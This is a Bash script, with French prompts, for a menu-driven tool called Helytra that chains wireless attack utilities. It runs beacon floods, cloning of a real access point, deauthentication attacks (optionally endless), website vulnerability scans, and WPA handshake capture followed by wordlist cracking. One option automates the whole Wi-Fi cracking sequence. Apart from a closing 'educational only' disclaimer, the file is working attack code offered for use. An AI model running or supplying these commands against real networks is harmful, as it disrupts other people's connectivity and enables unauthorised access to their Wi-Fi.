#!/bin/bash
BON="\033[1;33m"
R="\033[1;31m"
V="\033[1;32m"
J="\033[1;33m"
C="\033[1;34m"
CF="\033[34m"
VI="\033[1;35m"
B="\033[1;36m"
END="\033[0m"
clear

#Placement des option

chars=ABCDEF123456789
mono=0
noring=0
outil=0
ring=0
PR=0
bug=0
SLP=0.2
SLP2=0.5
dev=1
noringonoff=désactiver
IN=wlan0

# Placement des chemins d'acces au module 

aircrack=/bin/aircrack-ng
airodump=/usr/sbin/airodump-ng
airbase=/usr/sbin/airbase-ng
mdk3=/usr/sbin/mdk3
nmcli=/usr/bin/nmcli
gnome=/usr/bin/gnome-terminal
aireplay=/usr/sbin/aireplay-ng

#Starting

if [ "$1" == "-h" ]; then
  echo "[Info]
	[i] Pour sélectionner un outil avec -outil veuillez préciser -noring ou -ring

	[i] Si la vérification des modules vous affiche une erreur cela peut être dû au chemin d'accès
	    Dans ce cas la changer manuellement a l'aide d'un éditeur de texte
  
[Command]

	No monitoring: -noring
	monitoring: -ring
	Faste: -speed
	dev mode: -dev

	Outil: -tool

	[1] Perso Beacon Flood [Monitoring asked]

	[2] Simple Beacon Flood [Monitoring asked]

	[3] Copy Real Wifi acces point [Monitoring asked]

	[4] Deauthentication attack [Monitoring asked]

	[5] Scan Website using 2 Tools

	[6] Try to Crack HandShake

	[7] Simple Perso Beacon [Monitoring asked]

	[8] Fast Ip Locator

	[9] Earth Tool

	[10] Try To hack Wifi (Mode monitoring automatique)

	[i] Issues, Bug, Info

	Exemple: ./helytra -noring -outil 9 {Lance helytra sans le monitoring et lance l'outil 9}
		 ./helytra -ring -outil 3 {Lance helytra avec le monitoring et lance l'outil 3}
		 ./helytra {monitoring option} {outil} {Numéro}
"

  	exit 0
elif [ "$1" = "-noring" ];then
	noring=1
	noringonoff=activer
elif [ "$1" = "-ring" ];then
	ring=1
fi

if [ "$3" = "1" ];then
tool=1
outil=99
toolonoff=activer

elif [ "$3" = "2" ];then
tool=2
outil=99
toolonoff=activer

elif [ "$3" = "3" ];then
tool=3
toolonoff=activer

elif [ "$3" = "4" ];then
tool=4
outil=99
toolonoff=activer

elif [ "$3" = "5" ];then
tool=5
outil=99
toolonoff=activer

elif [ "$3" = "6" ];then
tool=6
outil=99
toolonoff=activer

elif [ "$3" = "7" ];then
tool=7
outil=99
toolonoff=activer

elif [ "$3" = "8" ];then
tool=8
outil=99
toolonoff=activer

elif [ "$3" = "9" ];then
tool=9
outil=99
toolonoff=activer

elif [ "$3" = "10" ];then
tool=10
outil=99
toolonoff=activer

elif [ "$3" = "i" ];then
tool=i
outil=99
toolonoff=activer
else 
tool=0
outil=0
toolonoff=désactiver
fi

if [ "$1" = "-dev" ] || [ "$2" = "-dev" ] || [ "$3" = "-dev" ] || [ "$4" = "-dev" ] || [ "$5" = "-dev" ];then
dev=1
else
dev=0
fi

if [ "$1" = "-speed" ] || [ "$2" = "-speed" ] || [ "$3" = "-speed" ] || [ "$4" = "-speed" ] || [ "$5" = "-speed" ];then
SLP=0
SLP2=0
speedonoff=activer
else
speedonoff=désactiver
fi

# Lancement

echo -e "$V [i] Verification des Modules...$END"
sleep $SLP

if [ -e /bin/curl ];then
	echo -e "$V [✓] Curl Validé$END"
else
	echo -e "$R [x] Curl non Validé$END"
	echo -e "$R [!] Installer Curl et relancez le programme$END"
	bug=$(($bug + 1))
fi 
sleep $SLP

if [ -e /bin/aircrack-ng ];then
	echo -e "$V [✓] Aircrack-ng Validé$END"
else
	echo -e "$R [x] Aircrack-ng non Validé$END"
	bug=$(($bug + 1))
fi 
sleep $SLP

if [ -e /usr/sbin/airodump-ng ];then
	echo -e "$V [✓] Airodump-ng Validé$END"
else
	echo -e "$V [x] Airodump-ng non Validé$END"
	bug=$(($bug + 1))
fi
sleep $SLP

if [ -e /usr/sbin/airbase-ng ];then
	echo -e "$V [✓] Airbase-ng Validé $END"
else 
	echo -e "$R [x] Airbase-ng Non Validé $END"
	bug=$(($bug + 1))
fi
sleep $SLP

if [ -e /usr/sbin/mdk3 ];then
	echo -e "$V [✓] Mdk3 Validé $END"
else
	echo -e "$R [x] Mdk3 non Validé $END"
	bug=$(($bug + 1))
fi
sleep $SLP

if [ -e /usr/bin/nmcli ];then
	echo -e "$V [✓] Nmcli Validé $END"
else
	echo -e "$R [x] Nmcli non Validé $END"
	bug=$(($bug + 1))
fi
sleep $SLP

if [ -e /usr/bin/gnome-terminal ];then
	echo -e "$V [✓] Gnome-terminal Validé $END"
else
	echo -e "$R [x] Gnome-terminal non Validé $END"
	bug=$(($bug + 1))
fi
sleep $SLP

if [ -e /usr/sbin/aireplay-ng ];then
	echo -e "$V [✓] Aireplay-ng Validé $END"
else
	echo -e "$R [x] Aireplay-ng non Validé $END"
	bug=$(($bug + 1))
fi
sleep 0.2

if [ $bug = "1" ];then
echo -e "$C[i] Installation de la distribution Aircrack...$END"
sudo apt-get install aircrack-ng
echo -e "$C[i] Installation de la distribution Mdk3...$END"
sudo apt-get install mdk3
echo -e "$C[i] Seulement c'est tool son susceptible de ne pas être installé Si une erreur persiste vérifier les chemins d'accès$END"
elif [ $bug = "0" ];then
echo -e "$C [i] Tout les modules on été installer$END"
else
echo -e "$R[!] Erreur Critique [!]$END"
bug=$(($bug + 1))
fi

echo -e "$B       [*] Bienvenu Sure le programme Helytra [*] $END "
echo -e "\033[1;34m
          ____________    __      ____________
	  \_____     /   /_ \     \     _____/
	   \_____    \____/  \____/    _____/
	    \_____                    _____/
	       \___________  ___________/
	                 /____\ $END$J Version 1.0 $END
"

echo -e "$R[i] Lancez le programme en mode Super-utilisateur (En fonction des Outils utilisés) $END";
sleep $SLP2
if [ $ring = "1" ];then
sudo airmon-ng check kill
sudo airmon-ng start $IN
noring=1
mono=3
elif [ $ring = "0" ];then
sleep 0.1
fi

if [ $noring = "0" ];then
echo -e -n "$C[?] Lancez le mode Monitoring (y/n): $END";
read;
monochoix=$REPLY
elif [ $noring = "1" ];then
	monochoix=n
fi

if [ $monochoix = "y" ];then
mono=1
elif [ $monochoix = "n" ];then
mono=0
else
	echo -e "$R[!] Option indisponible ou inéxistante$END"
	sleep 2		
	exit
fi

if [ "$2" = "-outil" ];then
outilspace=activer
else
outilspace=désactiver
fi

if [ $dev = "1" ];then
	echo "mono = $mono"
	echo "ring = $ring"
	echo "noring = $noring [$noringonoff]"
	echo "monochoix = $monochoix"
	echo "outil = $outil [$outilspace]"
	echo "tool = $tool [$toolonoff]"
	echo "speed = $SLP [$speedonoff]"
	echo "bug = $bug "
elif [ $dev = "0" ];then
	true	
else
	false
fi


#Rapelle

if [ $ring = "1" ];then
noring=0
mono=3
else
sleep 0.1
fi

if [ $mono = "1" ];then
	sudo airmon-ng check kill
	sudo airmon-ng start $IN
	BON="\033[1;32m"
	PBON="\033[1;31m"
elif [ $mono = "0" ];then
	echo -e "$B[i] Monitoring non activé $END"
	BON="\033[1;31m"
	PBON="\033[1;32m"
elif [ $mono = "3" ];then
	echo -e "$B[i] Monitoring activé $END"
	BON="\033[1;32m"
	PBON="\033[1;31m"
else
	echo -e "$R[!] Option indisponible ou inéxistante$END"
	sleep 2		
	exit
fi


# Menu

if [ $outil = "0" ];then
echo " "
echo -e "$C[1] Perso Beacon Flood $END $BON[Monitoring]$END"
echo " "
echo -e "$C[2] Simple Beacon Flood $END $BON[Monitoring]$END"
echo " "
echo -e "$C[3] Copy Real Wifi acces point $END $BON[Monitoring]$END"
echo " "
echo -e "$C[4] Deauthentication attack $END $BON[Monitoring]$END"
echo " "
echo -e "$C[5] Scan Website using 2 Tools $END"
echo " "
echo -e "$C[6] Try to Crack HandShake $END"
echo " "
echo -e "$C[7] Simple Perso Beacon $END $BON[Monitoring]$END"
echo " "
echo -e "$C[8] Fast Ip Locator $END"
echo " "
echo -e "$C[9] Earth Tool $PBON[No Monitoring] $END"
echo " "
echo -e "$C[10] Try To hack Wifi $PBON[No Monitoring]$END"
echo " "
echo -e "$C[i] Issues, Bug, Info $END"
echo " "
echo -e -n "$V[*] Séléctioner une option: $END";
read;
tool=$REPLY
elif [ $outil = "99" ];then
sleep 0.2
else
exit
fi


# Zone des choix

if [ $tool = "1" ];then
	echo -e "$B[i] Perso Beacon Flood Séléctioner $END"
	CH=1
	PR=1
elif [ $tool = "2" ];then
	echo -e "$B[i] Simple Beacon Flood Séléctioner $END"
	CH=2
	PR=1
elif [ $tool = "3" ];then
	echo -e "$B[i] Copy Real Wifi acces point Séléctioner $END"
	CH=3
	PR=1
elif [ $tool = "4" ];then
	echo -e "$B[i] Deauthentication attack Séléctioner $END"
	CH=4
	PR=1
elif [ $tool = "5" ];then
	echo -e "$B[i] Scan Website using 2 Tools Séléctioner $END"
	CH=5
	PR=0
elif [ $tool = "6" ];then
	echo -e "$B[i] Try to Crack HandShake Séléctioner $END"
	CH=6
	PR=0
elif [ $tool = "7" ];then
	echo -e "$B[i] Simple Perso Beacon Séléctioner $END"
	CH=7
	PR=1
elif [ $tool = "8" ];then
	echo -e "$B[i] Fast Ip Locator Séléctioner $END"
	CH=8
	PR=0
elif [ $tool = "9" ];then
	echo -e "$B[i] Earth Tool Séléctioner $END"
	CH=9
	PR=0
elif [ $tool = "10" ];then
	echo -e "$B[i] Try To hack Wifi Séléctioner $END"
	CH=10
	PR=1
elif [ $tool = "i" ];then
	#echo -e "$B [i] Chargement Du Text...$END"
	CH=i
	PR=0
else
	echo -e "$R[!] Option indisponible ou inéxistante$END"
	sleep 2
	clear
	exit
fi

# Séléction d'interface

if [ $PR = "1" ];then
	echo -e -n "$V[*] Entré le nom de votre interface: $END";
	read;
	IN=$REPLY
	echo -e "$B[i] Interface $IN Séléctioner $END"
elif [ $PR = "0" ];then
	echo -e "$B[i] Aucune Interface necessaire$END"
else
	sleep 0.1
fi

# Zone de Lancement des modules

if [ $CH = "2" ];then
	echo -e "$B[i] Lancement...$END"
	sudo mdk3 $IN b
elif [ $CH = "1" ];then
	echo -e -n "$V[*] Entré le chemin d'acces au fichier: $END";
	read;
	AC=$REPLY
	echo -e "$B[i] Chemin $AC séléctioner"
	echo -e "$B[i] Lancement...$END"
	sudo mdk3 $IN b -f $AC
elif [ $CH = "3" ];then
gnome-terminal --working-directory=WORK_DIR -x bash -c "nmcli -p dev wifi; bash"
	echo -e -n "$V[*] Séléctioner un BSSID: $END";
	read;
	BSSID=$REPLY
	echo -e "$B[i] BSSID: $BSSID Séléctioner$END"
	echo -e -n "$V[*] Séléctioner un SSID: $END";
	read;
	SSID=$REPLY
	echo -e "$B[i] BSSID: $SSID Séléctioner$END"
	echo -e -n "$V[*]Séléctioner un Chanel: $END";
	read;
	CHA=$REPLY
	echo -e "$B[i] Lancement...$END"
	sudo airbase-ng -a $BSSID --essid "$SSID" -c $CHA $IN
elif [ $CH = "4" ];then
gnome-terminal --working-directory=WORK_DIR -x bash -c "nmcli -p dev wifi; bash"
	echo -e -n "$V[*] Séléctioner un BSSID: $END";
	read;
	BSSID=$REPLY
	echo -e -n "$V[*] Nombre de packet a envoyer (0 Pour infini): $END";
	read;
	PA=$REPLY
	sudo aireplay-ng -0 $PA -a $BSSID $IN
elif [ $CH = "5" ];then
	echo -e -n "$V[*] Url du site: $END";
	read;
	URL=$REPLY
	echo -e -n "$V[*] Nom du fichier resulta: $END";
	read;
	RESULT=$REPLY
	echo -e -n "$V[*] Chemin pour sauvegarder votre fichier $RESULT: $END";
	read;
	PLACE=$REPLY
gnome-terminal --working-directory=WORK_DIR -x bash -c "sudo skipfish -o $RESULT $URL; bash"
gnome-terminal --working-directory=WORK_DIR -x bash -c "sudo nikto -h $URL; bash"
elif [ $CH = "6" ];then
	echo -e -n "$V[*] Chemin pour Fichier .cap:  $END";
	read;
	CAP=$REPLY
	echo -e -n "$V[*] Chemin pour la Wordlist:  $END";
	read;
	WORD=$REPLY
	echo -e "$B[i] Lancement...$END"
gnome-terminal --working-directory=WORK_DIR -x bash -c "aircrack-ng -w $WORD $CAP; bash"
elif [ $CH = "7" ];then
	echo -e -n "$V [*] Nom du Beacon: $END";
	read;
	NAME=$REPLY
	echo -e -n "$V [*] Chaine du Beacon: $END";
	read;
	BCH=$REPLY
	sudo airbase-ng -e $NAME -c $BCH $IN
elif [ $CH = "8" ];then
	echo -e -n "$V[*] Adresse IP: $END";
	read;
	curl http://ip-api.com/json/$REPLY
	echo ""
elif [ $CH = "9" ];then
	echo -e "$V [i] Lancement... $END"
	firefox https://platform.leolabs.space/visualizations/leo
elif [ $CH = "10" ];then
	echo -e "$R[!] Fonctionne Seulement avec les reseau Wifi avec une sécurité PSK $END"
	echo -e "$J[i] Stoper la command avec Control+C. Quand le Wi-Fi voulu apparaît $END"
gnome-terminal --title="Nmcli" --working-directory=WORK_DIR -x bash -c "nmcli -p dev wifi; bash"
	echo -e -n "$V[*] Séléctioner un BSSID: $END";
	read;
	BSSID=$REPLY
	echo -e -n "$V[*] Séléctioner une chaine: $END";
	read;
	chaine=$REPLY
	echo -e -n "$V[*] Chemin d'acces a une Wordlist: $END";
	read;
	Wordlist=$REPLY
	echo -e "$V[i] Les fichiers seront sauvegardés dans le fichier où est placée Helytra$END"
	sleep 1
	sudo airmon-ng start $IN
gnome-terminal --title="Airodump" --working-directory=WORK_DIR -x bash -c "sudo airodump-ng -c $chaine --bssid $BSSID -w PSK $IN; bash"
sleep 5
gnome-terminal --title="Aireplay" --working-directory=WORK_DIR -x bash -c "sudo aireplay-ng -0 20 -a $BSSID $IN; bash"
while [ -z $reponse ] || [ $reponse != 'stop' ]
do
        read -p 'Dites stop quand le handshake et capturé: ' reponse
done
	echo -e -n "$V[*] Numero du Fichier .cap (Le nombre dois etre inferieur a 10): $END";
	read;
	capnum=$REPLY
	echo -e "$B[i] Lancement...$END"
gnome-terminal --title="Aircrack" --working-directory=WORK_DIR -x bash -c "sudo aircrack-ng -w $Wordlist PSK-0$capnum.cap; bash"
fi

if [ $CH = "i" ];then
echo -e "
[Info]

   Helytra est un Shortcut pour plusieur utilisateur de tool Principalement dans le Wireless.

   Totalement en Bash il respect entiérement la sécurité de votre appareil 

[Bug]
  
  Le bug le plus commun avec se tool c'est la faute de frappe ou le non-passage en monitoring pour certaines options

  Si un module n'est pas détecté par helytra vérifié le chemin d'accès

  Si les terminal Gnome se ferment automatiquement Essayer de lancer le program en mode Super-Utilisateur

  (No replay interface specified.) Cela Signifie que sois le mode Monitoring et activer avent le lancement d'Helytra ou une faute de frappe

  (This program requires root privileges.) Cela Signifie que le droit Super-Utilisateur n'a pas été donner au programme 

  (Please specify a dictionary) Le chemin d'acces a une Wordlist na pas été donner au programme

	$R! Ce Programme a été consu à des fins éducatives uniquement !$END"
else
sleep 2
fi

echo -e "$B[♥]$CF Tank you for using Elytra $B[♥] $END"
echo -e "$B By termolumix on Github$END"
